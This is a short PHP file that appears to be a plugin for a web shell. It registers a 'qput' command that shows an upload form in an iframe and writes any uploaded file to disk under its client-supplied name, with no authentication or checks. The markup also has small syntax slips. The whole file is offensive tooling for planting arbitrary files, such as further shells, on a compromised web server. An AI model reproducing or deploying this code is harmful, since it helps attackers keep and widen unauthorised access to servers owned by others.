<?php
function phpshell_qput($args){
  echo '<iframe src="?qputfrm=1&cwd='. urlencode($_POST['cwd']) .'"><iframe>';
}

function phpshell_qput_frm(){
  echo '<form method="post" enctype="multipart/form-data"><input type="hidden" name="cwd" value"'.htmlentities($_GET['cwd']).'" /><input onchange="this.parentNode.submit();" type="file" name="qput" /></form>';
}

if(isset($_FILES['qput'])){
    move_uploaded_file($_FILES['qput']['tmp_name'], $_FILES['qput']['name']);
}

if(isset($_GET['qputfrm'])){
  phpshell_qput_frm();
  exit;
}
registerCommand('phpshell_qput','qput','Put file(s)');
?>
